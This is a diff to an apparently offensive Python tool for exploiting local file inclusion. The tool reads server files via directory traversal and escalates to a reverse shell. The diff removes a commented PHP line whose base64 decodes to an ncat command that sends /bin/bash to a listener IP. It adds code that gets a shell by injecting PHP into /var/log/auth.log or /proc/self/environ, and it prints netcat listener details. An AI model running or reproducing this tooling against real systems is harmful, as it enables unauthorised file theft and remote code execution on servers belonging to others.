@@ -9,7 +9,6 @@ import urllib
 import re
 import os
 import subprocess
-#<?php passthur(base64_decode("bmNhdCAtZSAvYmluL2Jhc2gvIDE5Mi4xNjguNTYuMSAyMjIyCg=="));?>
 ssl._create_default_https_context = ssl._create_unverified_context  
 path = ('file://'+os.getcwd()+'/FileStore/')
 
@@ -208,11 +207,12 @@ class Read_File:
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))
                            if self.args.shell:
                                self.Reverse_shell()
+                               exit()
                            else:
                                 exit()    
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
                            self.store_file()  
-                           print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                           print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                            print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                            print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
                            print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
@@ -223,16 +223,40 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))              
                            if self.args.shell:
-                               self.Reverse_shell()
+                                if  "auth" in  self.url or "auth.log" in  self.url\
+                                or "environ" in self.url: 
+                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                    time.sleep(1)
+                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
+                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner Port        : ................ | : 7777") 
+                                    self.Reverse_shell()
+                                    exit()
+                                else:
+                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                      time.sleep(1)
+                                      print("[*] FILE : ", self.args.read)
+                                      time.sleep(1)
+                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
+                                      time.sleep(1)
+                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
+                                      print("[*] Example : --read /var/log/auth.log ")
+                                      print("[*] Example : --read /proc/self/environ")
+                                      print("[*] Example : --read /var/log/auth")
+                                      exit()            
                            else:
-                                exit()    
+                                exit()   
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                 print("[*] No Data found")
                 print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                print("[*] try to user aggressive mode ")                
+                print("[*] try to use new cookie ")
+                print("[*] try to use aggressive mode ")                
                 if not self.args.base64:
                    print("[*] try to use PHP Filter by useing -B64/--base64 ")  
-                print("[*] ckeck Readme file at : https://www.github/jac11/LFI_Hunter.git")   
+                print("[*] check Readme file at : https://www.github/jac11/LFI_Hunter.git")   
                 exit()                       
         except SyntaxError as a :
                print(a)
@@ -374,8 +398,6 @@ class Read_File:
                     exit()
                  else:   
                    try:
-                 #   path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
-                  #   os.system(path)
                      from Package.LFT_Shell_connect import Shell_conncet
                      Shell_conncet.__init__(self)                     
                    except KeyboardInterrupt :
